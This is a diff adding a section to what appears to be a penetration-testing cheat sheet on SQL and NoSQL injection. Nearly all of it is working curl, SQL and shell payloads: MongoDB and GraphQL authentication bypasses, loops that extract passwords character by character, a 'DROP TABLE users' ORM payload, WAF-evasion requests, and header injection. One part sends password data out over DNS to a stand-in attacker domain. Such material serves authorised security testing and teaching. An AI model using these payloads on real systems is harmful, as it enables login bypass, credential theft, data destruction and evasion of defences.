@@ -598,3 +598,349 @@ MySQL 8.0.32 (identified via sqlmap `--fingerprint`)
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
 - https://portswigger.net/web-security/sql-injection
 - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+
+---
+
+## 2026 SQLi + NoSQL Techniques
+
+### 1. NoSQL Injection Deep Dive
+
+#### MongoDB ($where, $regex, $gt, $ne)
+```bash
+# Authentication bypass via operator injection
+curl -sk -X POST "https://target/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
+
+# $where JavaScript injection (RCE in older MongoDB)
+curl -sk -X POST "https://target/api/search" \
+  -H "Content-Type: application/json" \
+  -d '{"$where":"sleep(5000)"}'
+
+# Time-based blind via $where
+curl -sk -X POST "https://target/api/search" \
+  -H "Content-Type: application/json" \
+  -d '{"$where":"this.password.match(/^a/) ? sleep(5000) : 1"}'
+
+# $regex password extraction (character by character)
+for c in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
+  r=$(curl -sk -o /dev/null -w '%{http_code}' -X POST "https://target/login" \
+    -H "Content-Type: application/json" \
+    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}")
+  [ "$r" = "200" ] && echo "CHAR: $c"
+done
+
+# $gt operator bypass (password greater than empty = always true)
+curl -sk -X POST "https://target/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":{"$gt":""}}'
+
+# URL-encoded operator injection (for form-encoded endpoints)
+curl -sk -X POST "https://target/login" \
+  --data-urlencode 'username[$ne]=' \
+  --data-urlencode 'password[$ne]='
+```
+
+#### CouchDB
+```bash
+# Admin party check (unauthenticated config access)
+curl -sk "https://target:5984/_config"
+curl -sk "https://target:5984/_all_dbs"
+curl -sk "https://target:5984/_users/_all_docs?include_docs=true"
+
+# Mango query injection
+curl -sk -X POST "https://target:5984/db/_find" \
+  -H "Content-Type: application/json" \
+  -d '{"selector":{"password":{"$gt":null}},"fields":["_id","username","password"]}'
+```
+
+#### DynamoDB
+```bash
+# DynamoDB condition expression injection
+# If app builds FilterExpression from user input:
+curl -sk -X POST "https://target/api/items" \
+  -H "Content-Type: application/json" \
+  -d '{"filter":"attribute_exists(password)"}'
+
+# PartiQL injection (SQL-compatible DynamoDB queries)
+curl -sk -X POST "https://target/api/query" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"SELECT * FROM Users WHERE username='\''admin'\'' OR 1=1"}'
+```
+
+### 2. GraphQL + SQL Injection Chaining
+
+```bash
+# SQLi through GraphQL variables
+curl -sk -X POST "https://target/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query":"query($id:String!){user(id:$id){name email}}",
+    "variables":{"id":"1 UNION SELECT username,password FROM users--"}
+  }'
+
+# SQLi through GraphQL argument directly
+curl -sk -X POST "https://target/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ user(id:\"1'\'' OR 1=1--\") { name email } }"}'
+
+# Batch query SQLi (multiple injections in one request)
+curl -sk -X POST "https://target/graphql" \
+  -H "Content-Type: application/json" \
+  -d '[
+    {"query":"{ user(id:\"1'\'' AND SLEEP(5)--\") { name } }"},
+    {"query":"{ user(id:\"1'\'' UNION SELECT version()--\") { name } }"}
+  ]'
+
+# sqlmap with GraphQL
+# Save the request as a file:
+cat > /tmp/graphql-req.txt <<'EOF'
+POST /graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"query":"{ user(id:\"1*\") { name email } }"}
+EOF
+sqlmap -r /tmp/graphql-req.txt --batch --level=3
+```
+
+### 3. ORM Injection
+
+```bash
+# Prisma (Node.js) — raw query injection
+# If app uses prisma.$queryRaw or prisma.$executeRaw with string interpolation:
+curl -sk -X POST "https://target/api/users" \
+  -H "Content-Type: application/json" \
+  -d '{"orderBy":"name; DROP TABLE users--"}'
+
+# Sequelize — order clause injection
+# Sequelize allows arrays in order: [[column, direction]]
+curl -sk -X POST "https://target/api/items" \
+  -H "Content-Type: application/json" \
+  -d '{"sort":"name; SELECT pg_sleep(5)--","direction":"ASC"}'
+
+# SQLAlchemy — filter injection via text()
+# If app passes user input to text() or filter():
+curl -sk "https://target/api/search?filter=1%3B%20SELECT%20pg_sleep(5)--"
+
+# ActiveRecord — order injection (Rails)
+# If app passes user input to .order():
+curl -sk "https://target/items?sort=name%3B%20SELECT%20pg_sleep(5)--"
+curl -sk "https://target/items?sort=CASE%20WHEN%201=1%20THEN%20name%20ELSE%20name%20END"
+
+# Detect ORM by error messages
+curl -sk "https://target/api/items?id='" | grep -iE 'sequelize|prisma|sqlalchemy|activerecord|typeorm|hibernate'
+```
+
+### 4. JSON/JSONB Column Injection (PostgreSQL)
+
+```sql
+-- If app queries JSONB columns with user-controlled path:
+-- Vulnerable: SELECT * FROM users WHERE data->>'role' = '{input}'
+' UNION SELECT 1,data::text FROM users WHERE data->>'role'='admin'--
+
+-- JSONB path injection
+' OR data @> '{"role":"admin"}'--
+
+-- Extract JSONB keys
+' UNION SELECT 1,jsonb_object_keys(data) FROM users LIMIT 1--
+
+-- JSONB nested extraction
+' UNION SELECT 1,data->'credentials'->>'password' FROM users--
+```
+
+```bash
+# Test JSONB injection
+curl -sk "https://target/api/users?role=admin'%20OR%20data%20%40%3E%20'{\"role\":\"admin\"}'--"
+
+# Detect JSONB columns via error
+curl -sk "https://target/api/users?filter={'test'}" | grep -i 'jsonb\|json_extract\|->>'
+```
+
+### 5. Window Function Abuse for Data Exfiltration
+
+```sql
+-- Use window functions to extract data row-by-row through blind injection
+' AND (SELECT CASE WHEN (SELECT SUBSTRING(
+  (SELECT password FROM users ORDER BY id LIMIT 1 OFFSET 0)
+  ,1,1))='a' THEN 1 ELSE 1/0 END)=1--
+
+-- ROW_NUMBER() for ordered extraction
+' UNION SELECT 1,password,3 FROM (
+  SELECT password, ROW_NUMBER() OVER (ORDER BY id) as rn FROM users
+) t WHERE rn=1--
+
+-- LAG/LEAD to compare adjacent rows
+' UNION SELECT 1,LAG(password) OVER (ORDER BY id),3 FROM users--
+
+-- NTILE for batch extraction
+' UNION SELECT 1,GROUP_CONCAT(password),3 FROM (
+  SELECT password, NTILE(4) OVER (ORDER BY id) as bucket FROM users
+) t WHERE bucket=1--
+```
+
+### 6. DNS-Based Out-of-Band Exfiltration
+
+```bash
+# sqlmap DNS exfiltration (receives data via DNS queries to your server)
+sqlmap -u "https://target/p?id=1" \
+  --dns-domain="sqli.yourserver.tld" \
+  --batch
+
+# Manual DNS exfil — MSSQL
+# Payload: '; DECLARE @v VARCHAR(1024); SET @v=(SELECT TOP 1 password FROM users);
+#           EXEC('master..xp_dirtree "\\'+@v+'.sqli.yourserver.tld\\x"')--
+curl -sk "https://target/p?id=1%27%3B%20DECLARE%20%40v%20VARCHAR(1024)%3B%20SET%20%40v%3D(SELECT%20TOP%201%20password%20FROM%20users)%3B%20EXEC(%27master..xp_dirtree%20%22%5C%5C%27%2B%40v%2B%27.sqli.yourserver.tld%5Cx%22%27)--"
+
+# Manual DNS exfil — PostgreSQL (requires dblink extension)
+# ' UNION SELECT dblink_connect('host='||(SELECT version())||'.sqli.yourserver.tld user=x dbname=x')--
+
+# Manual DNS exfil — MySQL (Windows only, via LOAD_FILE UNC path)
+# ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.sqli.yourserver.tld\\x'))--
+
+# Monitor DNS hits
+dig @yourserver.tld axfr sqli.yourserver.tld 2>/dev/null || \
+  interactsh-client -v -server https://oob.yourserver.tld
+```
+
+### 7. WAF Bypass — Advanced Techniques
+
+```bash
+# Inline comments to break keyword detection
+curl -sk "https://target/p?id=1'%20/*!UNION*//*!SELECT*/1,2,3--"
+
+# Scientific notation to bypass numeric filters
+curl -sk "https://target/p?id=1e0UNION%20SELECT%201,2,3--"
+
+# Unicode normalization bypass (WAF sees unicode, DB sees ASCII)
+curl -sk "https://target/p?id=1%EF%BC%87%20OR%201%3D1--"
+# %EF%BC%87 = fullwidth apostrophe, some apps normalize to '
+
+# HTTP Parameter Pollution
+curl -sk "https://target/p?id=1&id=%27%20OR%201%3D1--"
+# Backend may concatenate: id = "1' OR 1=1--"
+
+# Chunked transfer encoding to split payload across chunks
+printf 'POST /p HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n3\r\nid=\r\n14\r\n1'\'' UNION SELECT 1--\r\n0\r\n\r\n' | nc target 80
+
+# Case variation + comment splitting
+curl -sk "https://target/p?id=1'%20uNi/**/On%20sEl/**/ECt%201,2,3--"
+
+# Null byte injection (older WAFs)
+curl -sk "https://target/p?id=1'%00%20OR%201=1--"
+
+# Double URL encoding
+curl -sk "https://target/p?id=1%2527%2520OR%25201%253D1--"
+
+# JSON content-type bypass (switch from form to JSON)
+curl -sk -X POST "https://target/p" \
+  -H "Content-Type: application/json" \
+  -d '{"id":"1'\'' UNION SELECT 1,2,3--"}'
+```
+
+### 8. Second-Order SQL Injection (Advanced)
+
+```bash
+# Step 1: Store payload in a field that gets saved to DB
+curl -sk -X POST "https://target/register" \
+  -d "username=admin'-- -&password=test123&email=test@test.com"
+
+# Step 2: Trigger the stored payload in a different context
+# Common triggers:
+# - Password change (SELECT password WHERE username = '<stored payload>')
+# - Admin user list (ORDER BY username)
+# - Export to CSV (unsanitized output)
+# - Email notifications (username in template)
+curl -sk -X POST "https://target/change-password" \
+  -H "Cookie: session=abc123" \
+  -d "new_password=newpass123"
+
+# Automated with sqlmap
+sqlmap -u "https://target/register" \
+  --data="username=test*&password=test&email=t@t.com" \
+  --second-url="https://target/profile" \
+  --batch --level=3 --risk=2 \
+  --technique=BEUST
+
+# Common second-order injection points:
+# 1. Register username → password reset query
+# 2. Profile "display name" → admin dashboard
+# 3. Order "shipping address" → shipping label generator
+# 4. Support ticket "subject" → internal ticket system
+# 5. File upload "filename" → file listing query
+```
+
+### 9. SQL Injection via HTTP Headers
+
+```bash
+# User-Agent injection (apps that log User-Agent to DB)
+curl -sk -A "' OR 1=1-- -" "https://target/"
+curl -sk -A "' AND SLEEP(5)-- -" "https://target/"
+
+# Referer injection
+curl -sk -H "Referer: ' OR 1=1-- -" "https://target/"
+
+# X-Forwarded-For injection (apps that log/check client IP)
+curl -sk -H "X-Forwarded-For: ' OR 1=1-- -" "https://target/"
+curl -sk -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)-- -" "https://target/"
+
+# Cookie value injection
+curl -sk -H "Cookie: lang=' UNION SELECT 1,2,3-- -" "https://target/"
+
+# Accept-Language injection (rare but exists in analytics)
+curl -sk -H "Accept-Language: en' OR 1=1-- -" "https://target/"
+
+# Custom header injection (check what headers the app reads)
+for H in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "X-Originating-IP" \
+         "User-Agent" "Referer" "X-Custom-IP" "True-Client-IP" "CF-Connecting-IP"; do
+  echo -n "Testing $H... "
+  start=$(date +%s%N)
+  curl -sk -H "$H: ' AND SLEEP(3)-- -" "https://target/" -o /dev/null -m 10
+  dur=$(( ($(date +%s%N) - start)/1000000 ))
+  echo "${dur}ms"
+done
+
+# sqlmap with custom header injection point
+sqlmap -u "https://target/" \
+  --headers="X-Forwarded-For: 1*" \
+  --batch --level=3 --risk=2
+```
+
+### 10. Time-Based Blind with Conditional Errors (Faster Than SLEEP)
+
+```sql
+-- Instead of SLEEP(5) which is slow, use conditional errors for boolean extraction:
+
+-- MySQL: division by zero error vs success
+' AND (SELECT CASE WHEN (SUBSTRING(version(),1,1)='8') THEN 1 ELSE 1/0 END)=1-- -
+-- True = 200 OK, False = 500 error (much faster than waiting for SLEEP)
+
+-- PostgreSQL: CAST error
+' AND (SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN 1 ELSE CAST('x' AS INT) END)=1-- -
+
+-- MSSQL: conversion error
+' AND (SELECT CASE WHEN (SUBSTRING(@@version,1,1)='M') THEN 1 ELSE CONVERT(INT,'x') END)=1-- -
+
+-- Oracle: UTL_INADDR error
+' AND (SELECT CASE WHEN (SUBSTR(banner,1,1)='O') THEN 1 ELSE TO_NUMBER('x') END FROM v$version WHERE ROWNUM=1)=1-- -
+```
+
+```bash
+# Automated error-based boolean extraction (faster than time-based)
+TARGET="https://target/p?id=1"
+CHARSET="abcdefghijklmnopqrstuvwxyz0123456789"
+EXTRACTED=""
+
+for pos in $(seq 1 32); do
+  for c in $(echo "$CHARSET" | fold -w1); do
+    code=$(curl -sk -o /dev/null -w '%{http_code}' \
+      "$TARGET'%20AND%20(SELECT%20CASE%20WHEN%20(SUBSTRING(version(),$pos,1))='$c'%20THEN%201%20ELSE%201/0%20END)=1--%20-")
+    if [ "$code" = "200" ]; then
+      EXTRACTED="${EXTRACTED}${c}"
+      echo "Position $pos: $c (total: $EXTRACTED)"
+      break
+    fi
+  done
+done
+echo "Extracted: $EXTRACTED"
+```
